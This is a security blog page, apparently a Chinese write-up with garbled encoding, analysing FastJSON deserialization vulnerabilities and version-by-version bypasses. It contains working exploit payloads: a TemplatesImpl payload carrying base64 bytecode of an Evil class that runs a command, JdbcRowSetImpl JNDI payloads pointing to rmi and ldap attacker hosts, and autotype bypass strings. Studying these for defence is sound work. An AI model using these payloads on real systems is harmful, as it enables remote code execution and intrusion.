<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>æµ…æFastJSONååºåˆ—åŒ–æ¼æ´ - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u6d45\u6790FastJSON\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "FastJSON \u7b80\u4ecb", url: "#fastjson_1" },
              {title: "FASTJSON\u548b\u7528", url: "#fastjson_2" },
              {title: "FASTJSON \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8d77\u6e90", url: "#fastjson_3" },
              {title: "\u5404\u7248\u672c\u590d\u73b0", url: "#_2" },
              {title: "\u6f0f\u6d1e\u68c0\u6d4b", url: "#_9" },
              {title: "\u5ba1\u8ba1\u5173\u952e\u5b57", url: "#_12" },
              {title: "\u53c2\u8003", url: "#_13" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
        è¡¨è¾¾å¼æ³¨å…¥
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
        xstream ååºåˆ—åŒ–
      </a>
    </div>
    
  </div>

    

    <h1 id="fastjson">æµ…æFastJSONååºåˆ—åŒ–æ¼æ´</h1>
<h2 id="_1">ç›®å½•</h2>
<ul>
<li><a href="#FastJSON-ç®€ä»‹">FastJSON ç®€ä»‹</a></li>
<li><a href="#FASTJSONå’‹ç”¨">FASTJSONå’‹ç”¨</a></li>
<li><a href="#FASTJSON-ååºåˆ—åŒ–æ¼æ´èµ·æº">FASTJSON ååºåˆ—åŒ–æ¼æ´èµ·æº</a></li>
<li><a href="#å„ç‰ˆæœ¬å¤ç°">å„ç‰ˆæœ¬å¤ç°</a><ul>
<li><a href="#1224">1.2.24</a><ul>
<li><a href="#TemplatesImpl">TemplatesImpl</a></li>
<li><a href="#JdbcRowSetImpl">JdbcRowSetImpl</a></li>
</ul>
</li>
<li><a href="#1225">1.2.25</a><ul>
<li><a href="#æ›´æ–°æœºåˆ¶">æ›´æ–°æœºåˆ¶</a></li>
<li><a href="#bypass-1Læ³•1225-1241">bypass 1ï¼ˆL;æ³•ï¼‰1.2.25-1.2.41</a></li>
<li><a href="#bypass-2jsonå†…ç½®1225-1247">bypass 2ï¼ˆjsonå†…ç½®ï¼‰1.2.25-1.2.47</a></li>
</ul>
</li>
<li><a href="#1242">1.2.42</a><ul>
<li><a href="#æ›´æ–°æœºåˆ¶">æ›´æ–°æœºåˆ¶</a></li>
<li><a href="#bypassåŒå†™ç»•è¿‡">bypassï¼ˆåŒå†™ç»•è¿‡ï¼‰</a></li>
</ul>
</li>
<li><a href="#1242">1.2.42</a><ul>
<li><a href="#æ›´æ–°æœºåˆ¶">æ›´æ–°æœºåˆ¶</a></li>
<li><a href="#Bypass">Bypass</a></li>
</ul>
</li>
<li><a href="#1244">1.2.44</a><ul>
<li><a href="#æ›´æ–°æœºåˆ¶">æ›´æ–°æœºåˆ¶</a></li>
<li><a href="#Bypass">Bypass</a></li>
</ul>
</li>
<li><a href="#1247-67">1.2.47-67</a><ul>
<li><a href="#æ›´æ–°æœºåˆ¶">æ›´æ–°æœºåˆ¶</a></li>
</ul>
</li>
<li><a href="#1268">1.2.68</a><ul>
<li><a href="#Bypass-expectClassç»•è¿‡AutoType--1268">Bypass expectClassç»•è¿‡AutoType  &lt;=1.2.68</a></li>
<li><a href="#è°ƒè¯•">è°ƒè¯•</a></li>
<li><a href="#å®æˆ˜Gadget">å®æˆ˜Gadget</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#æ¼æ´æ£€æµ‹">æ¼æ´æ£€æµ‹</a><ul>
<li><a href="#DNSLOG">DNSLOG</a></li>
<li><a href="#æŠ¥é”™æ£€æµ‹">æŠ¥é”™æ£€æµ‹</a></li>
<li><a href="#ç»•è¿‡å¼‚å¸¸">ç»•è¿‡å¼‚å¸¸</a></li>
</ul>
</li>
<li><a href="#å®¡è®¡å…³é”®å­—">å®¡è®¡å…³é”®å­—</a></li>
<li><a href="#å‚è€ƒ">å‚è€ƒ</a></li>
</ul>
<hr />
<hr />
<h2 id="fastjson_1">FastJSON ç®€ä»‹</h2>
<p>FastJson æ˜¯ä¸€ä¸ªç”±é˜¿é‡Œå·´å·´ç ”å‘çš„javaåº“ï¼Œå¯ä»¥æŠŠjavaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼ï¼Œä¹Ÿå¯ä»¥æŠŠJSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡ã€‚</p>
<p><a href="https://github.com/alibaba/fastjson" title="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a> ğŸ‘ˆé¡¹ç›®åœ°å€</p>
<p>â€œè‡ª2017å¹´3æœˆ15æ—¥ï¼Œfastjsonå®˜æ–¹ä¸»åŠ¨çˆ†å‡ºå…¶åœ¨<code>1.2.24</code>åŠä¹‹å‰ç‰ˆæœ¬å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±å®‰å…¨æ¼æ´ä»¥æ¥ï¼Œå„ç§æ–°å‹ç»•è¿‡å§¿åŠ¿å±‚å‡ºä¸ç©·ã€‚â€œâ€”â€”c014</p>
<h2 id="fastjson_2">FASTJSONå’‹ç”¨</h2>
<p>ç­”æ¡ˆï¼šç›´æ¥POMå¯¼å…¥ï¼Œæ–¹ä¾¿åœ°ä¸€æ‰¹</p>
<pre><code class="language-text">&lt;dependencies&gt;
    &lt;dependency&gt;
        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
        &lt;version&gt;x.x.xx&lt;/version&gt;
    &lt;/dependency&gt;
&lt;/dependencies&gt;
</code></pre>
<p>import com.alibaba.fastjson.JSON</p>
<p>fastjsonæœ‰ä¸¤ç§å¸¸è§çš„å¤„ç†JSONçš„æ–¹æ³•</p>
<ul>
<li><code>JSON.toJSONString()</code>æ–¹æ³•ï¼šå¯å°†å¯¹è±¡è½¬æ¢æˆ<code>JSON</code>å­—ç¬¦ä¸²</li>
<li><code>JSON.parseObject()</code>æ–¹æ³•ï¼šå°†<code>JSON</code>å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡ã€‚</li>
</ul>
<p>ä¸‹é¢çœ‹ä¸€æ³¢å®ä¾‹ï¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå°†å…¶è½¬ä¸ºJSONï¼Œç„¶åå†è½¬å›å¯¹è±¡ã€‚
åŒæ—¶å¯ä»¥å‘ç°ï¼Œåœ¨JSONåºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„getxxxæ–¹æ³•ï¼›åœ¨JSONååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•</p>
<pre><code class="language-text">public class App 
{
    public static class User{
        private String id;
        User(){
            System.out.println(&quot;User go&quot;);
        }
        public void setId(String ids){
            System.out.println(&quot;setId go&quot;);
            this.id=ids;
        }
        public String getId(){
            System.out.println(&quot;GetId go&quot;);
            return this.id;
        }
    }

    public static void main(String[] args){
        User a = new User();
        String json = JSON.toJSONString(a);
        System.out.println(json);
        System.out.println(JSON.parseObject(json,User.class));
    }
}

</code></pre>
<pre><code class="language-text">User go
GetId go
{}
User go
org.example.App$User@36d4b5c
</code></pre>
<h2 id="fastjson_3">FASTJSON ååºåˆ—åŒ–æ¼æ´èµ·æº</h2>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæŠŠJSONååºåˆ—åŒ–çš„è¯­å¥æ˜¯ JSON.parseObject(json,User.class)ï¼Œåœ¨æŒ‡å®šJSONæ—¶ï¼Œè¿˜éœ€è¦æŒ‡å®šå…¶æ‰€å±çš„ç±»ï¼Œæ˜¾å¾—ä»£ç å°±å¾ˆè‡ƒè‚¿ï¼Œæ‰€ä»¥å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨@type(autotype)å­—ç¬¦æ®µæ¥ä½¿å…¶ä¸é‚£ä¹ˆè‡ƒè‚¿ã€‚
åƒä¸‹é¢è¿™æ ·ï¼Œåœ¨JSONé€šè¿‡æŒ‡å®š@typeçš„å€¼æ¥å®ç°å®šä½æŸç±»ã€‚</p>
<pre><code class="language-text">JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;)
</code></pre>
<p>è™½è¯´è¿™ä¹ˆåšå¾ˆæ–¹ä¾¿ï¼Œä½†æ˜¯ä»¥è¿™ç§æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šæ‰§è¡Œç±»çš„æ„é€ æ–¹æ³•å’Œå±æ€§ç›¸å…³çš„getï¼Œsetæ–¹æ³•ã€‚</p>
<pre><code class="language-text">public class App 
{
    public static class User{
        private String id;
        User(){
            System.out.println(&quot;User go&quot;);
        }
        public void setId(String ids){
            System.out.println(&quot;setId go&quot;);
            this.id=ids;
        }
        public String getId(){
            System.out.println(&quot;GetId go&quot;);
            return this.id;
        }
    }

    public static void main(String[] args){
        System.out.println(JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;org.example.App$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;));
    }
}
</code></pre>
<pre><code class="language-text">User go
setId go
GetId go
{&quot;id&quot;:&quot;123&quot;}
</code></pre>
<p>æ‰€ä»¥åœ¨è¿™ä¸ªJSONååºåˆ—åŒ–æ¥å£å¤„ï¼Œæˆ‘ä»¬ä¼ å…¥æ¶æ„çš„JSONï¼Œå°±å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„æ„é€ æ–¹æ³•ä»¥åŠå±æ€§ç›¸å…³çš„getï¼Œsetæ–¹æ³•ã€‚
å¦‚æœæŸç±»çš„ç›¸å…³æ–¹æ³•é‡Œæœ‰å±é™©çš„ä»£ç ï¼ˆå¦‚æ‰§è¡ŒæŸä¸ªå‘½ä»¤ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€ æ¶æ„JSONè¾¾åˆ°RCEçš„ä½œç”¨ã€‚</p>
<p>å¦å¤–ï¼ŒJSON.parseObject("{"@type":"org.example.App\$User","id":"123"}",Feature.SupportNonPublicField) ï¼Œå¯ä»¥ç›´æ¥ä¸ºprivateæˆå‘˜èµ‹å€¼ï¼ˆä¸åŠ Feature.SupportNonPublicFieldæ˜¯æ— æ³•å¯¹privateæˆå‘˜èµ‹å€¼çš„ï¼‰ã€‚è™½ç„¶ä½†æ˜¯ï¼Œå³ä½¿æ˜¯privateå±æ€§ï¼Œå¦‚æœå®ƒæœ‰getteræˆ–setteré‚£ä¹ˆå®ƒçš„getterå’Œsetterä¾æ—§ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>demo</p>
<pre><code class="language-text">public static class User{
        private String id;
        User(){
            System.out.println(&quot;User go&quot;);
        }

    }

    public static void main(String[] args){
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        User a = JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.exp.Main.Main$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;,User.class);
        System.out.println(a.id);

        User b = JSON.parseObject(&quot;{\&quot;@type\&quot;:\&quot;com.exp.Main.Main$User\&quot;,\&quot;id\&quot;:\&quot;123\&quot;}&quot;,User.class,Feature.SupportNonPublicField);
        System.out.println(b.id);
    }

User go
null
User go
123
</code></pre>
<h2 id="_2">å„ç‰ˆæœ¬å¤ç°</h2>
<h3 id="1224">1.2.24</h3>
<h4 id="templatesimpl">TemplatesImpl</h4>
<p>æ˜¯çš„ï¼Œå°±æ˜¯7U21é“¾é‡Œé¢çš„TemplatesImplcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</p>
<p>è¿™ä¸ªç±»æœ¬èº«å°±å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä¼šå°†æˆå‘˜å˜é‡_bytecodesçš„æ•°æ®ä½œä¸ºç±»çš„å­—èŠ‚ç è¿›è¡ŒnewInsantceæ“ä½œä»è€Œè°ƒç”¨å…¶æ„é€ æ–¹æ³•æˆ–staticå—ã€‚æ•…å¯ä»¥fastjsonä¸ºå¥‘æœºå»è°ƒç”¨æ­¤ç±»ã€‚
ä½†æ˜¯ç”±äº_name å’Œ_bytecodes æ˜¯ç§æœ‰å±æ€§ï¼Œæ‰€ä»¥éœ€è¦FASTJSONååºåˆ—åŒ–æ¥å£æœ‰Feature.SupportNonPublicFieldå‚æ•°æ‰èƒ½å®ç°ï¼Œåˆ©ç”¨æ¡ä»¶å¾ˆè‹›åˆ»ï¼Œä½†æ˜¯æ¡ä»¶å…è®¸çš„è¯å°±å¾ˆæ–¹ä¾¿ï¼Œpayloadæ‰“è¿‡å»å°±å®Œäº‹ã€‚</p>
<p>â€œ<em>_tfactoryè¿™ä¸ªå­—æ®µåœ¨TemplatesImplæ—¢æ²¡æœ‰getæ–¹æ³•ä¹Ÿæ²¡æœ‰setæ–¹æ³•ï¼Œè¿™æ²¡å…³ç³»ï¼Œæˆ‘ä»¬è®¾ç½®_tfactoryä¸º{ },fastjsonä¼šè°ƒç”¨å…¶æ— å‚æ„é€ å‡½æ•°å¾—_tfactoryå¯¹è±¡ï¼Œè¿™æ ·å°±è§£å†³äº†æŸäº›ç‰ˆæœ¬ä¸­åœ¨defineTransletClasses()ç”¨åˆ°ä¼šå¼•ç”¨_tfactoryå±æ€§å¯¼è‡´å¼‚å¸¸é€€å‡ºã€‚</em>"</p>
<pre><code class="language-text">payload
{
  &quot;@type&quot; : &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
  &quot;_bytecodes&quot; : [&quot;yv66vgAAADQAPQoADQAcCQAdAB4IAB8KACAAIQcAIggAIwoAJAAlCgAkACYKACcAKAcAKQoACgAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwADgAPBwAuDAAvADABAAVQd25lZAcAMQwAMgAzAQAQamF2YS9sYW5nL1N0cmluZwEABGNhbGMHADQMADUANgwANwA4BwA5DAA6ADsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAA8AA8BABJ0ZXN0X2Zhc3Rqc29uL0V2aWwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA2VycgEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEAB3dhaXRGb3IBAAMoKUkBAA9wcmludFN0YWNrVHJhY2UAIQAMAA0AAAAAAAQAAQAOAA8AAQAQAAAAHQABAAEAAAAFKrcAAbEAAAABABEAAAAGAAEAAAAJAAEAEgATAAIAEAAAABkAAAADAAAAAbEAAAABABEAAAAGAAEAAAAXABQAAAAEAAEAFQABABIAFgACABAAAAAZAAAABAAAAAGxAAAAAQARAAAABgABAAAAHAAUAAAABAABABUACAAXAA8AAQAQAAAAawAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAIAEQAAAB4ABwAAAAsACAANABIADgAdABEAIAAPACEAEAAlABIAGAAAAAcAAmAHABkEAAEAGgAAAAIAGw&quot;],
  &quot;_name&quot; : &quot;a&quot;,
  &quot;_tfactory&quot; : {},
  &quot;outputProperties&quot; : {}
}
</code></pre>
<p>_bytecodesçš„ç±»é•¿è¿™æ ·,ç¼–è¯‘ç”ŸæˆEvil.classï¼Œå°†å­—èŠ‚ç è¯»å‡ºå¹¶ç”¨base64åŠ å¯†ï¼Œä½œä¸º_bytecodes</p>
<pre><code class="language-text">import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet{
static {
            System.err.println(&quot;Pwned&quot;);
            try {
                String[] cmd = {&quot;calc&quot;};
                java.lang.Runtime.getRuntime().exec(cmd).waitFor();
            } catch ( Exception e ) {
                e.printStackTrace();
            }
         }

         @Override
         public void transform(DOM arg0, SerializationHandler[] arg1) throws TransletException {
                  // anything
         }

         @Override
         public void transform(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2) throws TransletException {
                  // anything
         }
}
</code></pre>
<h4 id="jdbcrowsetimpl"><strong>JdbcRowSetImpl</strong></h4>
<p><strong>com.sun.rowset.JdbcRowSetImpl</strong>,é€šè¿‡JNDIæ³¨å…¥æ¥å®ç°RCEã€‚ä½†éœ€æ³¨æ„JNDIæ³¨å…¥æœ‰JDKç‰ˆæœ¬é™åˆ¶ï¼Œé«˜ç‰ˆæœ¬éœ€è¦è¿›è¡Œç»•è¿‡ã€‚</p>
<p>æˆ‘ä»¬çš„payloadä¸€èˆ¬é•¿è¿™æ ·</p>
<pre><code class="language-text">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi:/ip:port/Exploit&quot;,&quot;autoCommit&quot;:true}
or
{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://ip:1099/exp&quot;,&quot;autoCommit&quot;:true}
</code></pre>
<p>æŠŠè¿™ä¸ªpayloadæ‰“è¿‡å»ï¼Œä¼šæ‰§è¡ŒsetAutoCommit()ï¼ŒåˆsetAutoCommit()æ‰§è¡Œäº†connct()å‡½æ•°ï¼Œå…¶å¦‚ä¸‹ã€‚
connect()ä¼šå¯¹dataSourceNameå±æ€§è¿›è¡Œä¸€ä¸ªInitialContext.lookup(dataSourceName),ä»è€Œå®ç°JNDIæ³¨å…¥ã€‚</p>
<pre><code class="language-text">private Connection connect() throws SQLException {
        if(this.conn != null) {
            return this.conn;
        } else if(this.getDataSourceName() != null) {
            try {
                InitialContext var1 = new InitialContext();
                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;)?var2.getConnection(this.getUsername(), this.getPassword()):var2.getConnection();
            } catch (NamingException var3) {
                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
            }
        } else {
            return this.getUrl() != null?DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()):null;
        }
    }
</code></pre>
<h3 id="1225">1.2.25</h3>
<h4 id="_3">æ›´æ–°æœºåˆ¶</h4>
<p>1.2.24åŠä»¥å‰ç‰ˆæœ¬å°±è·Ÿç™½çº¸ä¸€æ ·éšä¾¿æ‰“ï¼Œåœ¨1.2.25å¼€å§‹åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶</p>
<p>æˆ‘ä»¬ç»§ç»­ç”¨1.2.24çš„payloadï¼ˆè¿™é‡Œç”¨TemplatesImplçš„payloadï¼‰å»æ‰“ï¼Œä¼šå‘ç°æŠ¥é”™autotypeä¸æ”¯æŒ</p>
<p><img alt="image-20210907163503833" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907163503833.png" title="image-20210907163503833" /></p>
<p>ç©¶å…¶åŸå› ï¼Œæ˜¯å› ä¸ºåœ¨com.alibaba.fastjson.parser.ParserConfig åŠ å…¥äº†CheckAutoTypeæ–¹æ³•</p>
<pre><code class="language-text">com.alibaba.fastjson.parser.ParserConfig !public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass)
</code></pre>
<p><strong>åœ¨å…¶ä¸­æœ‰ä¸ªautotypesupportå±æ€§ï¼Œå¦‚æœä¸ºfalseï¼Œé‚£ä¹ˆå°±ä¼šæ£€æµ‹jsonä¸­@typeçš„å€¼ å¼€å¤´æ˜¯å¦ä¸é»‘åå•ä¸­çš„å€¼ä¸€æ ·ï¼Œè‹¥ä¸€æ ·å°±ç›´æ¥è¿”å›ä¸€ä¸ªå¼‚å¸¸ï¼Œç„¶ååŠ è½½ç™½åå•ä¸­çš„ç±»</strong></p>
<pre><code class="language-text">if (!autoTypeSupport) {
      \\é»‘åå•æ£€æµ‹ï¼Œclassnameæ˜¯ä¼ å…¥ç±»çš„å…¨åï¼ŒdenyListæ˜¯é»‘åå•
            for (int i = 0; i &lt; denyList.length; ++i) {
                String deny = denyList[i];
                if (className.startsWith(deny)) {
                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);
                }
            }
            for (int i = 0; i &lt; acceptList.length; ++i) {
                String accept = acceptList[i];
                if (className.startsWith(accept)) {
                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                    if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {
                        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());
                    }
                    return clazz;
                }
            }
        }

</code></pre>
<p><img alt="image-20210907164922626" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907164922626.png" title="image-20210907164922626" /></p>
<p>é»‘åå•é•¿è¿™æ ·</p>
<p><strong>è‹¥autotypesupportå¼€å¯ï¼Œåˆ™ä¼šå…ˆç™½åå•åŠ è½½ï¼Œåé»‘åå•æ£€æµ‹</strong></p>
<pre><code class="language-text">if (autoTypeSupport || expectClass != null) {
    for (int i = 0; i &lt; acceptList.length; ++i) {
        String accept = acceptList[i];
        if (className.startsWith(accept)) {
            return TypeUtils.loadClass(typeName, defaultClassLoader);
        }
    }

    for (int i = 0; i &lt; denyList.length; ++i) {
        String deny = denyList[i];
        if (className.startsWith(deny)) {
            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
        }
    }
}
</code></pre>
<p>åé¢çš„è®¸å¤šæ›´æ–°éƒ½æ˜¯å¯¹checkAutotypeä»¥åŠæœ¬èº«æŸäº›é€»è¾‘ç¼ºé™·å¯¼è‡´çš„æ¼æ´è¿›è¡Œä¿®å¤ï¼Œä»¥åŠé»‘åå•çš„ä¸æ–­å¢åŠ ã€‚</p>
<h4 id="bypass-1l1225-1241">bypass 1ï¼ˆL;æ³•ï¼‰1.2.25-1.2.41</h4>
<p>å½“autoTypeSupportå¼€å¯æˆ–expectClassä¸ä¸ºç©ºæ—¶ï¼Œä¼šè°ƒç”¨ä¸€ä¸ªloadclassæ–¹æ³•</p>
<pre><code class="language-text">if (this.autoTypeSupport || expectClass != null) {
    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
}
</code></pre>
<p>è€Œåœ¨å…¶ä¸­ï¼Œè‹¥ç±»åä»¥Lå¼€å¤´ï¼›ç»“å°¾ï¼Œåˆ™ä¼šæŠŠè¿™ä¸¤ä¸ªå­—ç¬¦å»æ‰å¹¶åŠ è½½ç±»ã€‚</p>
<p>â€œè‡³äºä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§å¥‡æ€ªçš„å¤„ç†ï¼ŒL å’Œ ; è¿™ä¸€å¯¹å­—ç¬¦å…¶å®æ˜¯ JVM å­—èŠ‚ç ä¸­ç”¨æ¥è¡¨ç¤ºç±»åçš„ï¼šâ€</p>
<pre><code class="language-text">if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) {
    String newClassName = className.substring(1, className.length() - 1);
    return loadClass(newClassName, classLoader);
}
</code></pre>
<p>æ‰€ä»¥åœ¨autotypesupportå¼€å¯æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹payloadæ¥bypass</p>
<pre><code class="language-text">{&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:1099&quot;,&quot;autoCommit&quot;:true}
</code></pre>
<p>å¦‚ä½•å¼€å¯autotypesupportï¼Ÿåªéœ€åœ¨jsonè¢«è§£æå‰åŠ å…¥å¦‚ä¸‹ä»£ç å³å¯</p>
<pre><code class="language-text">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
</code></pre>
<h4 id="bypass-2json1225-1247">bypass 2ï¼ˆjsonå†…ç½®ï¼‰1.2.25-1.2.47</h4>
<ul>
<li>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportåè€Œä¸èƒ½æˆåŠŸè§¦å‘ï¼›</li>
<li>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨ï¼›</li>
</ul>
<pre><code class="language-text">{
    &quot;a&quot;:{
        &quot;@type&quot;:&quot;java.lang.Class&quot;,
        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
    },
    &quot;b&quot;:{
        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
        &quot;dataSourceName&quot;:&quot;ldap://localhost:1389/Exploit&quot;,
        &quot;autoCommit&quot;:true
    }
}
</code></pre>
<h3 id="1242">1.2.42</h3>
<h4 id="_4">æ›´æ–°æœºåˆ¶</h4>
